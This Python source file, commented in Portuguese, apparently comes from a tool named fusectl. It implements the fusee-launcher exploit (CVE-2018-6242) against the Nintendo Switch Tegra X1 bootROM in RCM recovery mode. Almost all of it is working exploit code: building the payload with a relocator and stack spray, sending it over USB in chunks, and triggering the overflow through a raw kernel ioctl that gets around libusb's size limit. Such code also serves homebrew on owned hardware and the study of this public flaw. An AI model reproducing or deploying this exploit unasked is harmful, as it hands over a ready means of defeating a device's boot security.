"""
Injetor de payload RCM para Nintendo Switch (Tegra X1 - Erista).

Implementa o protocolo fusee-launcher (CVE-2018-6242):
1. Ler device ID (16 bytes)
2. Construir payload com intermezzo + payload real
3. Enviar em blocos de 0x1000 via USB bulk transfer
4. Acionar vulnerabilidade com control transfer de tamanho alto

Baseado no trabalho de Kate Temkin / ReSwitched (fusee-launcher).
"""

import ctypes
import fcntl
import os
import struct
from glob import glob
from pathlib import Path
from typing import Optional

import usb.core

from fusectl.core.logger import get_logger
from fusectl.rcm.detector import find_rcm_device
from fusectl.rcm.intermezzo import INTERMEZZO

log = get_logger("rcm.injector")

RCM_PAYLOAD_ADDR = 0x40010000
RCM_PAYLOAD_START = 0x40010E40
STACK_SPRAY_START = 0x40014E40
STACK_SPRAY_END = 0x40017000

COPY_BUFFER_ADDRESSES = [0x40005000, 0x40009000]
STACK_END = 0x40010000

CHUNK_SIZE = 0x1000
RCM_CMD_LENGTH = 0x30298
MAX_PAYLOAD_LENGTH = 0x30000

USB_WRITE_EP = 0x01
USB_READ_EP = 0x81
USB_TIMEOUT_MS = 1000

SUPPORTED_HCD_PATHS = ["pci/drivers/xhci_hcd", "platform/drivers/dwc_otg"]


class RCMError(Exception):
    pass


def _disable_autosuspend(device: usb.core.Device) -> None:
    """Desabilita autosuspend via sysfs para evitar que o kernel suspenda o device."""
    sysfs_root = Path("/sys/bus/usb/devices/")
    if not sysfs_root.is_dir():
        return
    try:
        for entry in sysfs_root.iterdir():
            busnum = entry / "busnum"
            devnum = entry / "devnum"
            if not (busnum.is_file() and devnum.is_file()):
                continue
            if (int(busnum.read_text().strip()) == device.bus
                    and int(devnum.read_text().strip()) == device.address):
                power_control = entry / "power" / "control"
                autosuspend = entry / "power" / "autosuspend_delay_ms"
                if power_control.is_file():
                    power_control.write_text("on")
                if autosuspend.is_file():
                    autosuspend.write_text("-1")
                log.info("Autosuspend desabilitado: %s", entry.name)
                return
    except PermissionError:
        log.warning("Sem permissão para desabilitar autosuspend (regra udev deve cobrir)")
    except (ValueError, OSError) as exc:
        log.warning("Falha ao desabilitar autosuspend: %s", exc)


class _SubmitURB(ctypes.Structure):
    """Estrutura USBDEVFS_SUBMITURB para ioctl direto ao kernel."""

    _fields_ = [
        ("type", ctypes.c_ubyte),
        ("endpoint", ctypes.c_ubyte),
        ("status", ctypes.c_int),
        ("flags", ctypes.c_uint),
        ("buffer", ctypes.c_void_p),
        ("buffer_length", ctypes.c_int),
        ("actual_length", ctypes.c_int),
        ("start_frame", ctypes.c_int),
        ("stream_id", ctypes.c_uint),
        ("error_count", ctypes.c_int),
        ("signr", ctypes.c_uint),
        ("usercontext", ctypes.c_void_p),
    ]


def _validate_xhci(device: usb.core.Device) -> None:
    """Verifica se o dispositivo está conectado a um controlador xHCI/dwc_otg."""
    for hcd_path in SUPPORTED_HCD_PATHS:
        for path in glob(f"/sys/bus/{hcd_path}/*/usb*"):
            busnum_file = os.path.join(path, "busnum")
            if not os.path.isfile(busnum_file):
                continue
            with open(busnum_file) as f:
                if device.bus == int(f.read().strip()):
                    return
    raise RCMError(
        "O dispositivo precisa estar numa porta USB 3.0 (azul) com controlador xHCI."
    )


def _build_payload(payload_data: bytes) -> bytes:
    """Monta o payload completo seguindo o layout do fusee-launcher original.

    O header RCM (680 bytes) e consumido pelo protocolo e NAO entra no IRAM.
    Offsets no IRAM = offset no buffer - 680. O intermezzo no buffer offset
    680 fica no IRAM em 0x40010000, e salta para 0x40010E40 (user payload).

    Layout no buffer USB:
        0x0000: RCM_CMD_LENGTH (4 bytes LE)
        0x0004: NOP sled (676 bytes de zeros = ANDEQ condicionais ARM)
        0x02A8: Intermezzo relocator (124 bytes)
        0x0324: Padding zeros (3524 bytes)
        0x10E8: User payload parte 1 (ate 0x4000 bytes)
        0x50E8: Stack spray (0x40010000 repetido 2160x)
        0x72A8: User payload parte 2 (restante)
        Final:  Alinhado a 0x1000
    """
    if len(payload_data) > MAX_PAYLOAD_LENGTH:
        raise RCMError(
            f"Payload excede tamanho máximo: {len(payload_data)} > {MAX_PAYLOAD_LENGTH}"
        )

    payload = struct.pack("<I", RCM_CMD_LENGTH)
    payload += b"\x00" * (680 - len(payload))

    payload += INTERMEZZO

    padding_size = (RCM_PAYLOAD_START - RCM_PAYLOAD_ADDR) - len(INTERMEZZO)
    payload += b"\x00" * padding_size

    first_part_size = STACK_SPRAY_START - RCM_PAYLOAD_START
    payload += payload_data[:first_part_size]
    if len(payload_data) < first_part_size:
        payload += b"\x00" * (first_part_size - len(payload_data))

    spray_count = (STACK_SPRAY_END - STACK_SPRAY_START) // 4
    payload += struct.pack("<I", RCM_PAYLOAD_ADDR) * spray_count

    if len(payload_data) > first_part_size:
        payload += payload_data[first_part_size:]

    remainder = len(payload) % CHUNK_SIZE
    if remainder:
        payload += b"\x00" * (CHUNK_SIZE - remainder)

    return payload


def _read_device_id(device: usb.core.Device) -> Optional[bytes]:
    """Le o device ID de 16 bytes do Switch em modo RCM.

    Retorna None se o read falhar (timeout). O device ID e apenas
    diagnóstico e não e usado na construção do payload.
    """
    try:
        device_id = device.read(USB_READ_EP, 16, timeout=USB_TIMEOUT_MS)
        log.info("Device ID: %s", device_id.tobytes().hex())
        return bytes(device_id)
    except usb.core.USBTimeoutError:
        log.warning("Timeout ao ler device ID (continuando sem ele)")
        return None


def _write_payload(device: usb.core.Device, payload: bytes) -> int:
    """Envia payload em chunks de 0x1000 bytes."""
    bytes_sent = 0
    total_chunks = (len(payload) + CHUNK_SIZE - 1) // CHUNK_SIZE
    current_buffer = 0
    for offset in range(0, len(payload), CHUNK_SIZE):
        chunk = payload[offset : offset + CHUNK_SIZE]
        device.write(USB_WRITE_EP, chunk, timeout=USB_TIMEOUT_MS)
        bytes_sent += len(chunk)
        current_buffer = 1 - current_buffer
    log.info("Payload enviado: %d bytes em %d chunks", bytes_sent, total_chunks)
    return current_buffer


def _switch_to_highbuf(device: usb.core.Device, current_buffer: int) -> int:
    """Garante que o buffer ativo seja o high buffer (0x40009000).

    O trigger precisa do high buffer para que o tamanho do control transfer
    seja exatamente 0x7000 (STACK_END - 0x40009000). Se o buffer atual for
    o low buffer (indice 0), envia um chunk vazio para alternar.
    """
    if current_buffer != 1:
        device.write(USB_WRITE_EP, b"\x00" * CHUNK_SIZE, timeout=USB_TIMEOUT_MS)
        current_buffer = 1 - current_buffer
        log.info(
            "Buffer alternado para high (0x%X)", COPY_BUFFER_ADDRESSES[current_buffer]
        )
    return current_buffer


def _trigger_vulnerability(device: usb.core.Device, current_buffer: int) -> None:
    """Aciona a vulnerabilidade via ioctl direto (bypassa limite de pagina do libusb).

    O libusb limita control transfers ao tamanho de uma pagina (~4096 bytes),
    mas o exploit precisa de um request de 0x7000 bytes. Usamos ioctl
    USBDEVFS_SUBMITURB direto ao kernel para contornar essa limitação.
    """
    _validate_xhci(device)

    length = STACK_END - COPY_BUFFER_ADDRESSES[current_buffer]
    log.info("Acionando vulnerabilidade: length=0x%X", length)

    SETUP_PACKET_SIZE = 8
    IOCTL_IOR = 0x80000000
    IOCTL_NR_SUBMIT_URB = 10
    URB_CONTROL_REQUEST = 2

    setup_packet = (
        struct.pack("<B", 0x82)
        + struct.pack("<B", 0x00)
        + struct.pack("<H", 0)
        + struct.pack("<H", 0)
        + struct.pack("<H", length)
    )

    buffer_size = SETUP_PACKET_SIZE + length
    buffer = ctypes.create_string_buffer(setup_packet, buffer_size)

    request = _SubmitURB()
    request.type = URB_CONTROL_REQUEST
    request.endpoint = 0
    request.buffer = ctypes.addressof(buffer)
    request.buffer_length = buffer_size

    ioctl_number = (
        IOCTL_IOR
        | ctypes.sizeof(request) << 16
        | ord("U") << 8
        | IOCTL_NR_SUBMIT_URB
    )

    dev_path = f"/dev/bus/usb/{device.bus:03d}/{device.address:03d}"
    fd = os.open(dev_path, os.O_RDWR)
    try:
        fcntl.ioctl(fd, ioctl_number, request, True)
    except OSError:
        pass
    finally:
        os.close(fd)

    log.info("Vulnerabilidade acionada")


def inject(payload_path: Path, device: Optional[usb.core.Device] = None) -> None:
    """Injeta payload no Switch em modo RCM.

    Segue a mesma sequência do fusee-launcher original:
    1. find_device
    2. read device ID (16 bytes)
    3. write payload em chunks de 0x1000
    4. trigger vulnerability via ioctl direto

    Args:
        payload_path: Caminho para o arquivo .bin do payload.
        device: Dispositivo USB (opcional, detecta automáticamente).

    Raises:
        RCMError: Se o Switch não for encontrado ou o payload falhar.
        FileNotFoundError: Se o arquivo de payload não existir.
    """
    if not payload_path.is_file():
        raise FileNotFoundError(f"Payload não encontrado: {payload_path}")

    if device is None:
        device = find_rcm_device()
        if device is None:
            raise RCMError("Switch em modo RCM não detectado")

    log.info(
        "Iniciando injeção: %s (bus %d, device %d)",
        payload_path.name,
        device.bus,
        device.address,
    )

    _disable_autosuspend(device)
    _read_device_id(device)

    payload_data = payload_path.read_bytes()
    log.info("Payload lido: %d bytes", len(payload_data))

    payload = _build_payload(payload_data)
    log.info(
        "Payload montado: %d bytes (%d chunks)",
        len(payload),
        len(payload) // CHUNK_SIZE,
    )

    current_buffer = _write_payload(device, payload)
    current_buffer = _switch_to_highbuf(device, current_buffer)
    _trigger_vulnerability(device, current_buffer)

    log.info("Injeção concluída com sucesso: %s", payload_path.name)
